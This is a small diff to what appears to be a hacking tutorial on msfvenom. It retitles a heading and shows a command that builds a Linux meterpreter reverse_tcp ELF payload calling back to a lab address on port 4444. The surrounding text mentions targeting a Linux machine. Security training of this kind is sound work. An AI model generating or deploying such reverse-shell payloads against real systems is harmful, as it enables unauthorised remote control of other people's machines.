@@ -29,7 +29,7 @@ reverse_tcp allows the remote computer to connect to you.
 
 $`msfvenom --list format` This is the different types of formats that you can use. Since we are hacking a Linux machine, we will be using a elf file, which is the executable linux file. 
 
-Creating a payload 
+Creating a payload for your own Machine using MSFVENOM 
 
 $`msfvenom --payload linux/x64/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 --format elf -o file1`
 
